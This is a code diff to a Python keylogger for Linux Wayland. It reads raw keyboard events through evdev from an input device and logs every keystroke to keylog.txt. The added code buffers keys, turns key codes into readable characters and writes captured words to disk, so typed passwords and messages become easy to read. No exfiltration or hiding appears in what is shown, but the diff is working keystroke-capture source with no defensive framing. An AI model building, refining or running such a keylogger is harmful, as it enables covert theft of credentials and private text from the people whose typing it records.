@@ -5,11 +5,42 @@ from datetime import datetime
 
 LOG_FILE = "keylog.txt"
 WAYLAND_KEYBOARD_DEVICE = '/dev/input/event3'
+log_buffer = ""
+
+def write_buffer_to_file():
+    """Writes the current buffer to file and clears it"""
+    global log_buffer
+    if log_buffer:
+        with open(LOG_FILE, "a") as f:
+            f.write(log_buffer)
+        log_buffer = ""
 
 def log_to_file(message):
     """Writes a message to the log file."""
     with open(LOG_FILE, "a") as f:
         f.write(message)
+
+def append_to_log(char):
+    """Adds char to buffer. Flushes to file on Space or Enter."""
+    global log_buffer
+    print(char, end="", flush=True)
+    log_buffer += char
+    if char == " " or char == "\n":
+        write_buffer_to_file()
+
+def clean_evdev_key(event_code):
+    """Converts 'KEY_A' to 'a' and handles special keys"""
+    key = event_code.replace("KEY_", "")
+    if len(key) == 1:
+        return key.lower()
+    if key == "SPACE": return " "
+    if key == "ENTER": return "\n"
+    if key == "DOT": return "."
+    if key == "COMMA": return ","
+    if key == "BACKSPACE": return "[BSP]"
+    if key == "LEFTSHIFT" or key == "RIGHTSHIFT": return ""
+
+    return f"[{key}]"
 
 def run_evdev_mode():
     """Logic for Linux Wayland (Arch default) using evdev"""
@@ -30,12 +61,12 @@ def run_evdev_mode():
         log_to_file(f"\n--- Started evdev logging on {device.name} at {datetime.now()} ---\n")
 
         for event in device.read_loop():
-            if event.type == evdev.ecodes.EV_KEY:
-                data = evdev.categorize(event)
-                if data.keystate == 1:
-                    msg = f"{data.keycode}"
-                    print(msg)
-                    log_to_file(msg + "\n")
+            if event.type == evdev.ecodes.EV_KEY and event.value == 1:
+                raw_key = evdev.ecodes.KEY[event.code]
+                clean_char = clean_evdev_key(raw_key)
+
+                if clean_char:
+                    append_to_log(clean_char)
 
     except FileNotFoundError:
         print(f"\n[!] ERROR: Device '{WAYLAND_KEYBOARD_DEVICE}' not found.")
